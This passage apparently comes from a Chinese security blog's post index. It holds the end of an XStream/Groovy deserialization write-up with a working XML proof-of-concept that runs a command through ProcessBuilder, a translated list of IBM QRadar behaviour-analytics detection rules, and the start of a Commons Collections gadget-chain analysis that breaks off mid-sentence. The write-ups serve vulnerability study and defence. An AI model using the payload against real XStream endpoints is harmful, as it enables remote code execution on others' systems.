java.lang.ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;).call();\n通过java.lang.ProcessBuilder对象的start方法执行open命令\n根据上边的分析，MethodClosure.call() == &quot;command&quot;.execute()\n找到了存在缺陷的方法，接下来就要看有哪些地方调用了这个方法断点调试call()可以看到被hashcode()调用了\npublic int hashCode() &#123;    Object method = this.getProperties().get(&quot;hashCode&quot;);    if (method != null &amp;&amp; method instanceof Closure) &#123;        Closure closure = (Closure)method;        closure.setDelegate(this);        Integer ret = (Integer)closure.call();        return ret.intValue();    &#125; else &#123;        return super.hashCode();    &#125;&#125;\n\nhashCode的功能和特性\n如果两个对象相同，那么它们的hashCode  值一定要相同\n如果两个对象的hashCode相同，它们并不一定相同     \n上面说的对象相同指的是用eqauls方法比较\n\n所以当两个对象进行比较时，会调用hashcode和eqauls，如果结果一致则相等\npublic V put(K key, V value) &#123;    if (table == EMPTY_TABLE) &#123;        inflateTable(threshold);    &#125;    if (key == null)        return putForNullKey(value);    int hash = hash(key);    int i = indexFor(hash, table.length);    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;        Object k;        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;            V oldValue = e.value;            e.value = value;            e.recordAccess(this);            return oldValue;        &#125;    &#125;    modCount++;    addEntry(hash, key, value, i);    return null;&#125;\n\nput方法是用来向HashMap中添加新的元素，从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中\n所以当把我们构造的代码添加进去时，put就会调用hashcode进行比较，进而执行代码\npublic void setProperty(String property, Object newValue) &#123;    this.getProperties().put(property, newValue);&#125;\n\nObject method = this.getProperties().get(&quot;hashCode&quot;)自定义hashcode，调用setProperty可以绑定hashcode属性closure.call()注定了hashCode必须是Closure或者其子类才能最终调用call函数，MethodClosure类恰好是Closure的子类\n然后通过调用hashcode的put方法即可执行构造的代码\n\npoc\n&lt;map&gt;   &lt;entry&gt;     &lt;groovy.util.Expando&gt;       &lt;expandoProperties&gt;         &lt;entry&gt;           &lt;string&gt;hashCode&lt;/string&gt;           &lt;org.codehaus.groovy.runtime.MethodClosure&gt;             &lt;delegate class=&quot;groovy.util.Expando&quot; reference=&quot;../../../..&quot;/&gt;             &lt;owner class=&quot;java.lang.ProcessBuilder&quot;&gt;               &lt;command&gt;                 &lt;string&gt;open&lt;/string&gt;                 &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;               &lt;/command&gt;               &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;             &lt;/owner&gt;             &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt;             &lt;directive&gt;0&lt;/directive&gt;             &lt;parameterTypes/&gt;             &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt;             &lt;method&gt;start&lt;/method&gt;           &lt;/org.codehaus.groovy.runtime.MethodClosure&gt;         &lt;/entry&gt;       &lt;/expandoProperties&gt;     &lt;/groovy.util.Expando&gt;     &lt;int&gt;1&lt;/int&gt;   &lt;/entry&gt; &lt;/map&gt;\n\n\n\n参考：https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/http://avfisher.win/archives/tag/groovy\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"IBM QRadar UBA(用户行为分析) 规则集合","url":"/IBM%20QRadar%20UBA(%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90)%20%E8%A7%84%E5%88%99%E9%9B%86%E5%90%88/","content":"UBA 规则包摘要\n\n\nContent Pack\nCustom Rules\n\n\n\nAccess and Authentication\n42\n\n\nAccounts and Privileges\n32\n\n\nBrowsing Behavior\n20\n\n\nCloud\n16\n\n\nDNS Analyzer\n5\n\n\nDomain Controller\n15\n\n\nEndpoint\n22\n\n\nExfiltration\n27\n\n\nGeography\n12\n\n\nMaaS360\n10\n\n\nNetwork Traffic\n4\n\n\nOther\n50+\n\n\n\n\nAccess and authentication 访问和身份验证UBA：暴力验证尝试\n检测身份验证失败蛮力攻击（水平和垂直）。\nUBA：检测到来自锁定机器\n检测来自锁定机器的活动。\nUBA：非执行用户从外部网络访问的仅执行资产\n检测来自外部网络的非执行用户何时登录到供执行使用的资产。\nUBA：非执行用户从内部网络访问的仅限执行资产\n检测非执行用户何时登录仅供执行使用的资产。\nUBA：对关键资产的高风险用户访问\n检测用户何时参与事件（犯罪）访问关键资产。\nUBA：针对外部域的大量拒绝访问事件 \n检测何时有异常数量的针对任何外部域的拒绝访问事件。\nUBA：多个 VPN 帐户无法从单个 IP 登录\n检测任何 VPN 帐户登录失败。\nUBA：从单个 IP 登录的多个 VPN 帐户 \n映射来自同一 IP 地址的多个 VPN 用户，然后提高风险评分。\nUBA：企业防火墙中的远程访问漏洞 \n检测 GotoMyPC 和 OpenVPN 应用程序创建的防火墙中何时存在远程访问漏洞。\nUBA：重复未经授权的访问\n表示发现重复的未经授权的访问活动。\nUBA：终止的用户活动\n检测任何被列为已终止或已辞职的用户的活动。\nUBA：未经授权的访问\n表示发现了未经授权的访问活动。\nUBA：使用服务或机器帐户访问的 Unix/Linux 系统\n检测由 UNIX 和 Linux 服务器中的服务或计算机帐户启动的任何交互式会话（通过 GUI 和 CLI，本地和远程登录）。\nUBA：用户访问 - 对关键资产的访问失败 \n此规则检测位于关键资产参考集中的系统的身份验证失败。\nUBA：对关键资产的首次访问\n表示这是用户第一次访问关键资产。\nUBA：来自多个主机的用户访问 \n检测单个用户何时从超过允许数量的设备登录。\nUBA：用户从 Jump 服务器访问内部服务器\n检测单个用户何时从超过允许数量的设备登录。\nUBA：登录异常\n指示本地资产上的一系列登录失败。\nUBA：来自匿名来源的用户访问帐户 \n表示用户正在从匿名源（例如 TOR 或 VPN）访问内部资源。\nUBA：异常时间的用户访问\n表示用户在您的网络不寻常的时间成功进行身份验证。\nUBA：通过服务或机器帐户访问 VPN\n检测服务或计算机帐户何时访问 Cisco VPN。\nUBA：VPN 证书共享\n此规则检测 VPN 事件的用户名何时不等于“VPNSubjectcn”。这可能表明正在发生 VPN 证书共享。证书共享或其他身份验证令牌共享会使识别谁做了什么变得困难。如果发生妥协，这可能会使采取下一步措施变得复杂。\nUBA：使用服务或机器帐户进行 Windows 访问\n检测由 Windows Server 中的服务或计算机帐户启动的任何交互式会话（RDP、本地登录）。\nAccounts and privileges 帐户和权限UBA：添加了帐户或组或特权\n检测用户执行的并且属于以下类别之一的事件。\n\n    Authentication.Group Added\n\n\n    Authentication.Group Changed\n\n\n    Authentication.Group Member Added\n\n\n    Authentication.Computer Account Added\n\n\n    Authentication.Computer Account Changed\n\n\n    Authentication.Policy Added\n\n\n    Authentication.Policy Change\n\n\n    Authentication.Trusted Domain Added\n\n\n    Authentication.User Account Added\n\n\n    Authentication.User Account Changed\n\n\n    Authentication.User Right Assigned\n\n\n\nUBA：帐户或组或权限已修改\n指示用户帐户何时受到更改用户有效权限（向上或向下）的操作的影响。\nUBA：帐户删除造成的 DoS 攻击\n通过在固定时间跨度内根据固定阈值检查帐户删除事件的数量来检测 DoS 攻击。\nUBA：在短时间内创建和删除用户帐户\n检测在短时间内创建和删除用户帐户的时间。\nUBA：使用的休眠帐户 \n检测从已确定为休眠的帐户成功登录。\nUBA：尝试使用休眠帐户\n从已确定为休眠的帐户检测失败的登录尝试。\nUBA：已使用过期帐户\n表示用户尝试登录本地系统上已禁用或过期的帐户。\nUBA：首次权限提升\n表示用户第一次执行特权访问。\nUBA：检测到新帐户使用\n提供表明帐户首次成功使用的报告功能。\nUBA：可疑特权活动（首次观察到的特权使用）\n表示用户执行了该用户以前从未执行过的特权操作。\nUBA：可疑特权活动（很少使用的特权）\n表示用户执行了该用户最近未执行的特权操作。\nUBA：用户尝试使用已禁用帐户\n检测用户何时尝试使用禁用的帐户访问组织资源。\nUBA：用户尝试使用暂停的帐户\n检测用户何时尝试使用暂停或阻止的权限访问组织资源。\nBrowsing behavior 浏览行为UBA：浏览至业务/服务网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览至通信网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到教育网站\n检测到用户浏览与教育内容相关的网站。\nUBA：浏览至娱乐网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到赌博网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览至政府网站\n检测到用户浏览与政府内容相关的网站。\nUBA：浏览至信息技术网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览至求职网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览至 LifeStyle 网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到恶意网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到混合内容/可能是成人网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到网络钓鱼网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到色情网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到宗教网站\n用户访问了与宗教内容相关联的 URL。\nUBA：浏览到诈骗/可疑/非法网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：浏览到社交网络网站\n用户访问了归类为社交网络的网站。\nUBA：浏览至未分类网站\n用户访问的 URL 可能表明安全性或法律风险较高。\nUBA：用户访问有风险的 URL\n此规则检测本地用户何时访问有问题的在线内容。\nCloud 云相关UBA：匿名用户访问资源\n检测访问资源的匿名用户。\nUBA：未经授权的用户访问的 AWS 控制台\n检测到“AWS - 标准用户”参考集中授权列表之外的用户未经授权尝试访问 Amazon Web Services (AWS) 控制台。\nUBA：外部用户邮箱登录失败\n检测外部用户登录邮箱的重复失败。\nUBA：无法设置邮箱审核日志绕过\n检测用户何时未能正确设置邮箱审核日志绕过。\nUBA：收件箱设置为转发到外部收件箱\n检测邮箱是否设置为转发到信任域引用集中未列出的域。\nUBA：内部用户失败邮箱登录，随后成功\n在内部用户成功登录之前检测到多个邮箱登录失败。\nUBA：在短时间内添加和删除邮箱权限\n检测一个小时内添加和删除的邮箱权限。\nUBA：访问 AWS 资源的非标准用户 \n检测尝试访问 Amazon Web Services (AWS) 资源的非标准用户。\nUBA：共享发送给访客的链接 \n检测发送给来宾的共享邀请。\nUBA：共享策略已更改或共享外部 (SharePoint/OneDrive)\n检测项目的共享策略何时更改为与来宾用户共享。\nUBA：站点管理员将用户添加到 SharePoint 或 OneDrive 上的组\n检测系统管理员将用户添加到 Sharepoint 或 OneDrive 中的组。\nUBA：未能将用户添加到角色\n检测将用户添加到角色的尝试何时失败。\nDomain controller 域名控制UBA：尝试恢复 DPAPI 备份主密钥\n检测何时尝试恢复 DPAPI 主密钥。\nUBA：检测到 Kerberos 帐户枚举\n通过检测用于从同一源 IP 发出 Kerberos 请求的大量用户名来检测 Kerberos 帐户枚举。\nUBA：来自同一用户的多个 Kerberos 身份验证失败\n检测多个 Kerberos 身份验证票证拒绝或失败。\nUBA：对域控制器的非管理员访问\n检测对域控制器的非管理员帐户访问尝试。\nUBA：传递哈希\n检测在传递散列漏洞期间可能生成的 Windows 登录事件。\nUBA：可能的目录服务枚举\n检测对目录服务枚举的侦察尝试。\nUBA：域控制器上可能的 SMB 会话枚举\n检测对域控制器的 SMB 枚举尝试。\nUBA：可能的 TGT 伪造\n检测包含域名异常的 Kerberos TGT。这些可能表明使用 pass the ticket 漏洞生成的票证。\nUBA：可能的 TGT PAC 伪造\n检测到使用伪造的 PAC 证书从 Kerberos TGS 获取服务票证。\nUBA：来自非域控制器的复制请求 \n检测来自非法域控制器的复制请求。\nUBA：多台主机使用的 TGT 票证\n检测在两台（或更多）不同的计算机上使用的 Kerberos TGT 票证。\nEndpoint 端点UBA：检测不安全或非标准协议\n检测通过被视为不安全或非标准协议的未经授权协议进行通信的任何用户。\nUBA：检测持久 SSH 会话\n检测活动时间超过 10 小时的 SSH 会话。\nUBA：修改了 Internet 设置\n检测系统上 Internet 设置的修改。\nUBA：恶意软件活动 - 批量修改注册表\n检测在较短时间间隔内批量修改多个注册表值的进程。\nUBA：Netcat 进程检测 (Linux)\n检测 Linux 系统上的 netcat 进程。\nUBA：Netcat 进程检测 (Windows)\n在 Windows 系统上检测 Netcat 进程。\nUBA：在 Gold Disk 白名单之外执行的进程 (Linux)\n检测在 Linux 系统上创建的进程，并在进程超出Gold Disk 进程允许列表时发出警报。\nUBA：在 Gold Disk 白名单之外执行的进程 (Windows)\n检测在 Windows 系统上创建的进程，并在进程超出Gold Disk 进程许可名单时发出警报。\nUBA：检测到勒索软件行为\n检测勒索软件感染期间通常出现的行为。\nUBA：受限程序使用\n表示创建了一个进程，并且该进程名称与引用集“UBA : Restricted Program Filenames”中列出的二进制名称之一匹配。\nUBA：用户安装可疑应用程序\n检测应用程序安装事件，然后在发现可疑应用程序时发出警报。\nUBA：创建的卷影副本 \n检测使用 vssadmin.exe 或 Windows Management Instrumentation 命令行 (WMIC) 创建的卷影副本。\nExfiltration 泄漏UBA：云服务的数据泄露 \n检测正在将文件上传到个人云服务的用户。\nUBA：打印数据泄露 \n检测发送文件以进行打印或使用屏幕捕获工具（例如 Print Screen 和 Snipping Tool）的用户。\nUBA：可移动媒体的数据泄露 \n检测正在将文件传输到 USB 和 CD 等可移动媒体的用户。\nUBA：可能丢失数据\n检测由数据源、事件类别或与数据丢失检测和预防相关的特定事件确定的可能的数据丢失。\nUBA：可疑活动后的初始访问 \n在 24 小时内检测网络钓鱼或恶意软件活动以及随后的可疑访问活动。注意：编辑支持的构建块以监控适用于环境的任何规则。\nUBA：高风险用户的大量出站传输 \n检测到高风险用户的 200,000 字节或更多的出站传输。\nUBA：文件传输后的多个阻止文件传输\n通过检查最初被阻止但随后在 5 分钟内成功上传的文件上传来检测渗漏。\nUBA：多次阻止文件上传，然后成功上传\n检测何时有大量被阻止的文件上传，然后上传成功。\nUBA：潜在受损帐户\n检测可疑活动场景，然后在 24 小时内渗透。\nUBA：可疑访问，然后是数据泄露\n检测来自异常、受限或禁止位置的访问，然后进行数据泄露尝试。\nUBA：可疑活动，随后是泄露\n检测可疑活动场景，然后在 24 小时内渗透。 \nUBA：用户可能被钓鱼\n在一小时内检测到 3 个或更多针对单个用户的潜在网络钓鱼攻击实例。注意：编辑支持的构建块以监控适用于环境的任何规则。\nGeography 位置UBA：从新位置创建的异常帐户 \n检测来自新位置的异常帐户创建活动。\nUBA：从新位置创建的异常云帐户 \n从新位置检测云帐户创建活动。\nUBA：来自多个位置的用户访问 \n表示多个位置或来源同时使用同一个用户帐户。调整匹配和持续时间参数以调整响应性。\nUBA：禁止位置的用户访问 \n从不在“UBA：允许的位置列表”中的位置检测用户访问。\nUBA：受限位置的用户访问\n从“UBA：受限位置列表”中的某个位置检测用户访问。\nUBA：用户地理变化\n匹配表示用户从不同于用户上次远程登录的国家/地区远程登录。此规则还可能表明帐户被盗，尤其是在规则匹配发生的时间很近的情况下。\nUBA：来自异常位置的用户访问 \n表示用户能够在您的网络不常见的国家/地区进行身份验证。\nMaaS360 Security MaaS360 安全告警UBA：MaaS360 检测到具有低加密级别的设备 \n检测到设备的加密级别较低。\nUBA：由于非漫游数据使用导致 MaaS360 设备不合规\n设备不合规，因为它超出了 MaaS 管理员设置的移动使用限制。\nUBA：MaaS360 设备因设备被 root 不合规\n设备不合规，因为它已越狱或root以绕过操作系统限制。\nUBA：由于加密级别导致 MaaS360 设备不合规\n设备不合规，因为它支持 MaaS 管理员设置的指定加密级别。\nUBA：由于操作系统版本导致 MaaS360 设备不合规\n设备不合规，因为它需要更新的操作系统版本。\nUBA：收到 MaaS360 恶意 SMS\n检测到表明用户收到恶意 SMS 消息的 MaaS360 事件。\nUBA：收到 MaaS360 恶意电子邮件\n检测到表明用户收到恶意电子邮件的 MaaS360 事件。\nUBA：MaaS360 URL 访问被阻止\n检测到指示用户对 URL 的访问已被阻止的 MaaS360 事件。\nUBA：安装了 MaaS360 恶意软件应用程序\n检测 MaaS360 事件，表明用户的设备上有恶意软件。\nUBA：访问了 MaaS360 恶意 URL\n检测从 iOS 和 Android 设备单击的网络钓鱼链接，无论来源如何。\nNetwork traffic and attacks 网络流量和攻击UBA：检测到 D/DoS 攻击\n检测用户的网络拒绝服务 (DoS) 攻击。\nUBA：Honeytoken 活动\n使用 Honeytoken 帐户检测活动。\nUBA：网络流量：捕获监控和分析程序使用情况\n表示创建了一个进程，并且该进程名称与参考集“UBA：网络捕获、监视和分析程序文件名”中列出的二进制名称之一匹配。此参考集列出了网络数据包捕获软件的二进制名称。参考集预先填充了一些常见的网络协议分析软件文件名的名称。\nQRadar DNS Analyzer QRadar DNS 分析器UBA：对阻止列表域的潜在访问\n检测表明用户可能访问了阻止列表域的事件。\nUBA：对 DGA 域的潜在访问\n检测表明用户可能访问了 DGA（由算法生成的域）域的事件。\nUBA：对抢注域的潜在访问\n检测表明用户可能访问了抢注域的事件。\nUBA：对隧道域的潜在访问\n检测指示用户可能访问隧道域的事件。\nThreat intelligence  威胁情报UBA：为 Locky 检测 IOC\n使用从 X-Force 活动源填充的 URL 或 IP 检测显示 Locky 的妥协指标 (IOC) 的用户计算机。\nUBA：为 WannaCry 检测 IOC\n使用从 X-Force 活动源填充的 URL、IP 或哈希来检测显示 WannaCry 的妥协指标 (IOC) 的用户计算机。\nUBA：受监​​控日志源的多个会话（NIS 指令）\n在 5 分钟内检测到单个用户与同一 QRadar 日志源系统的连接超过 2 个。\nUBA：勒索软件修改的 ShellBags \n检测表明典型恶意软件或勒索软件行为的 ShellBag 注册表修改。\nUBA：用户访问有风险的 IP 匿名化\n此规则检测本地用户或主机何时连接到外部匿名化服务。\nUBA：用户访问有风险的 IP 僵尸网络 \n此规则检测本地用户或主机何时连接到僵尸网络命令和控制服务器。\nUBA：用户访问有风险的 IP 动态\n此规则检测本地用户或主机何时连接到动态分配的 IP 地址。\nUBA：用户访问有风险的 IP 恶意软件 \n此规则检测本地用户或主机何时连接到恶意软件主机。\nUBA：用户访问有风险的 IP 垃圾邮件 \n此规则检测本地用户或主机何时连接到垃圾邮件发送主机。\n机器学习规则部分UBA：异常出站传输尝试UBA：发现异常的出站转移尝试UBA：到外部域的异常数据量UBA：发现到外部域的数据量异常UBA : 对风险资源的异常访问UBA：发现异常访问风险资源UBA : 用户访问有风险的资源UBA : 风险资源UBA：用户行为、会话异常（按目的地）UBA：发现目的地的用户行为、会话异常UBA : User Event Frequency Anomaly - 研究主题UBA：用户事件频率异常 - 找到的类别UBA : User Running New Process（在 UBA 3.8.0 中替换为Process Usage ML 用户模型）UBA：用户量活动异常 - 到外部域的流量UBA：用户量活动异常 - 发现到外部域的流量UBA：用户量活动异常 - 到内部域的流量UBA：用户量活动异常 - 发现到内部域的流量UBA：用户活动异常量 - 流量UBA：用户活动量异常 - 发现流量\n以下规则和构建块以及它们提供的功能现在在 UBA 应用程序中进行管理：\nUBA：用户已休眠（无活动异常规则）BB:UBA : 休眠用户首次登录 (逻辑)BB:UBA : 休眠用户后续登录 (逻辑)UBA : 用户名，成功，休眠新账户UBA：用户帐户的用户名，成功，观察到UBA：用户帐户的用户名，成功，最近UBA：用户帐户的用户名，成功，最近更新BB:UBA：用户首次访问（逻辑）\n以下规则和构建块以及它们提供的功能现在通过允许非 UBA 规则与 UBA 一起使用来处理：\nQNIUBA：QNI - 访问不适当保护的服务 - 证书过期UBA：QNI - 访问不适当保护的服务 - 证书无效UBA：QNI - 访问不适当保护的服务 - 自签名证书UBA：QNI - 访问不适当保护的服务 - 弱公钥长度UBA：QNI - 观察到的与恶意软件威胁相关的文件哈希UBA：QNI - 在多个主机上观察到的文件哈希UBA：QNI - 在被拒绝的电子邮件收件人上检测到潜在的垃圾邮件/网络钓鱼尝试UBA：QNI - 从多次发送中检测到的潜在垃圾邮件/网络钓鱼主题服务器UBA : QNI - 机密内容被转移到国外\n系统监控UBA：可疑的 PowerShell 活动UBA：可疑的 PowerShell 活动（资产）UBA：可疑的命令提示符活动UBA：检测到用户访问控制绕过（资产）UBA：可疑的计划任务活动UBA：可疑的服务活动UBA：可疑的服务活动（资产）UBA：系统注册表（资产）中的可疑条目UBA：检测到可疑图像负载（资产）UBA：可疑管道活动（资产）UBA：受损主机上的可疑活动 UBA：受损主机（资产）上的可疑活动UBA：检测到可疑管理活动UBA：检测到创建可疑远程线程的进程（资产）UBA：检测到常见漏洞利用工具UBA：检测到常见漏洞利用工具（资产）UBA：检测到恶意进程UBA：访问了网络共享\n侦察UBA：检测到 DHCP 服务器异常扫描 UBA：检测到 DNS 服务器异常扫描 UBA：检测到数据库服务器异常扫描 UBA：检测到 FTP 服务器异常扫描 UBA：检测到游戏服务器异常扫描 UBA：检测到通用 ICMP异常扫描UBA：检测到通用 TCP异常扫描 UBA：检测到通用 UDP异常扫描 UBA：检测到 IRC 服务器异常扫描 UBA：检测到 LDAP 服务器异常扫描 UBA：检测到邮件服务器异常扫描 UBA：检测到消息服务器异常扫描 UBA：异常扫描检测到 P2P 服务器的UBA : 检测到代理服务器的异常扫描UBA：检测到 RPC 服务器异常扫描 UBA：检测到 SNMP 服务器异常扫描 UBA：检测到 SSH 服务器异常扫描 UBA：检测到 Web 服务器异常扫描 UBA：检测到 Windows 服务器异常扫描\n用于 Sysmon 的 IBM QRadar 内容检测到可能的键盘记录器检测到以系统用户权限启动的新的看不见的进程检测到在多个主机上远程执行的进程进程从异常目录开始（Recycle.bin，..）添加了隐藏的网络共享检测到 Powershell 恶意使用使用编码命令检测到 Powershell 恶意使用不寻常的过程（例如：word、iexplore、AcroRd..）启动命令外壳以系统权限启动的命令外壳检测到从受损主机成功登录到其他主机检测到可能的凭证转储工具无子进程启动/产生了一个进程从临时目录启动的进程系统进程的异常父级检测到可疑的 Svchost 进程已从受损主机访问网络共享已访问管理共享已从受损计算机访问管理共享进程从共享文件夹启动并创建线程到另一个进程检测到单台机器过度使用系统工具从受损主机访问网络共享资源的尝试过多失败从单一来源访问管理共享的尝试过多失败Powershell 已在受损主机中启动PsExec 已从受损主机启动检测到从受损主机到其他主机的 SMB 流量已从远程系统启动命令 Shell 或 Powershell已在受损主机中创建计划任务系统中安装了恶意服务检测到配置为使用 Powershell 的服务检测到配置为使用管道的服务\n适用于 Amazon AWS 的 IBM QRadar 内容扩展AWS 云：根用户的云活动AWS 云：关键 EC2 实例已停止或终止AWS 云：检测到从不同地区成功登录 AWS 控制台AWS 云：日志已被删除/禁用或停止AWS 云：来自不同源 IP 的多个控制台登录失败AWS 云：来自同一源 IP 的多个控制台登录失败AWS 云：来自不同源 IP 的多个失败的 API 请求AWS 云：来自同一源 IP 的多个失败的 API 请求AWS 云：来自同一用户名的多个失败的 API 请求\nIBM 安全侦察内容本地 L2L TCP 扫描器本地 L2L Windows 服务器扫描程序本地 L2L 游戏服务器扫描器本地 L2L DNS 扫描程序本地 L2L 邮件服务器扫描程序本地 L2L 代理服务器扫描程序本地 L2L IM 服务器扫描程序本地 L2L Web 服务器扫描程序本地 L2L P2P 服务器扫描器本地 L2L SNMP 扫描程序本地 L2L RPC 服务器扫描程序本地 L2L UDP 扫描器本地 L2L DHCP 扫描程序本地 L2L ICMP 扫描器\nQRadar Network Insights 内容QNI : 机密内容被转移到国外QNI : 访问不适当的安全服务 - 证书已过期QNI : 访问不适当的安全服务 - 证书无效QNI：从多个发送服务器检测到的潜在垃圾邮件/网络钓鱼主题QNI：在多个主机上观察到的文件哈希QNI：观察到的与恶意软件威胁相关的文件哈希QNI：在被拒绝的电子邮件收件人上检测到潜在的垃圾邮件/网络钓鱼尝试QNI : 访问不适当的安全服务 - 自签名证书QNI : 访问不适当的安全服务 - 弱公钥长度\n","categories":["安全数据分析"],"tags":["UEBA"]},{"title":"Apache-CommonsCollections Unserialize Vulnerabilities","url":"/JAVA%20Apache-CommonsCollections%20Unserialize%20Vulnerabilities/","content":"序列化\n是指把 Java 对象转换为字节序列的过程\n便于保存在内存、文件、数据库中\nObjectOutputStream类的 writeObject() 方法可以实现序列化\n\n反序列化\n是指把字节序列恢复为 Java 对象的过程\nObjectInputStream 类的 readObject() 方法用于反序列化\n\n\n0x00 Serialize and Unserialize序列化\n是指把 Java 对象转换为字节序列的过程\n便于保存在内存、文件、数据库中\nObjectOutputStream类的 writeObject() 方法可以实现序列化\n\n反序列化\n是指把字节序列恢复为 Java 对象的过程\nObjectInputStream 类的 readObject() 方法用于反序列化\n\n0x01 代码分析public interface Transformer &#123;    /**     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged     * @return a transformed object     * @throws ClassCastException (runtime) if the input is the wrong class     * @throws IllegalArgumentException (runtime) if the input is invalid     * @throws FunctorException (runtime) if the transform cannot be completed     */    public Object transform(Object input);&#125;\n接口的作用是 Transforms the input object (leaving it unchanged) into some output object.\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;    super();    iMethodName = methodName;    iParamTypes = paramTypes;    iArgs = args;&#125;/** * Transforms the input to result by invoking a method on the input. *  * @param input  the input object to transform * @return the transformed result, null if null input */public Object transform(Object input) &#123;    if (input == null) &#123;        return null;    &#125;    try &#123;        Class cls = input.getClass();        Method method = cls.getMethod(iMethodName, iParamTypes);        return method.invoke(input, iArgs);                &#125; catch (NoSuchMethodException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);    &#125; catch (IllegalAccessException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);    &#125; catch (InvocationTargetException ex) &#123;        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);    &#125;&#125;\nmethod.invoke(owner, args)：执行该Method.invoke方法的参数是执行这个方法的对象owner，和参数数组args，可以这么理解：owner对象中带有参数args的method方法。返回值是Object，也既是该方法的返回值。\n\ninput参数即是反射的对象iMethodName 、iParamTypes 为调用的方法名称以及该方法的参数类型iArgs 为对应方法的参数\n以上参数均可控\nInvokerTransformer继承了Transformer和Serializable接口，通过传入这三个参数通过Java的反射机制可以调用任意函数\n/**   * Constructor that performs no validation.   * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.   *    * @param constantToReturn  the constant to return each time   */  public ConstantTransformer(Object constantToReturn) &#123;      super();      iConstant = constantToReturn;  &#125;\n\n/** * Transforms the input by ignoring it and returning the stored constant instead. *  * @param input  the input object which is ignored * @return the stored constant */public Object transform(Object input) &#123;    return iConstant;&#125;\n返回iConstant属性参数可控\n/**     * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.     *      * @param transformers  the transformers to chain, not copied, no nulls     */    public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;    /**     * Transforms the input to result via each decorated transformer     *      * @param object  the input object passed to the first transformer     * @return the transformed result     */    public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;\n传入一个Transformer数组transform()方法是for循环调用Transformer数组的transform方法，参数为object\n这样就可以通过构造包含命令的 ChainedTransformer 对象，然后需要触发 ChainedTransformer 对象的 transform() 方法执行\n/** * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;. *  * @param value  the value to transform * @return the transformed value * @since Commons Collections 3.1 */protected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;\nTransformedMap 中的 checkSetValue() 方法会触发transform() \npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;    return new TransformedMap(map, keyTransformer, valueTransformer);&#125;\nTransformedMap是Map的一个封装，将Map对象转换，当Map参数修改，Transformer就会被调用\n可以首先构造一个 Map 和一个能够执行代码的 ChainedTransformer ，以此生成一个 TransformedMap\n构造好TransformedMap后就需要想办法触发checkSetValue() 函数\nclass AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;    private final Class&lt;? extends Annotation&gt; type;    private final Map&lt;String, Object&gt; memberValues;    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;        this.type = type;        this.memberValues = memberValues;    &#125;\n\nprivate void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    s.defaultReadObject();    // Check to make sure that types have not evolved incompatibly    AnnotationType annotationType = null;    try &#123;        annotationType = AnnotationType.getInstance(type);    &#125; catch(IllegalArgumentException e) &#123;        // Class is no longer an annotation type; all bets are off        return;    &#125;    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;        String name = memberValue.getKey();        Class&lt;?&gt; memberType = memberTypes.get(name);        if (memberType != null) &#123;  // i.e. member still exists            Object value = memberValue.getValue();            if (!(memberType.isInstance(value) ||                  value instanceof ExceptionProxy)) &#123;                // 此处触发一些列的Transformer                memberValue.setValue(                    new AnnotationTypeMismatchExceptionProxy(                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                            annotationType.members().get(name)));            &#125;        &#125;    &#125;&#125;\nreadObject()函数中对memberValues的每一项调用了setValue()函数\npublic Object setValue(Object value) &#123;    value = parent.checkSetValue(value);    return entry.setValue(value);&#125;\nsetValue()会触发checkSetValue()\n所以构造 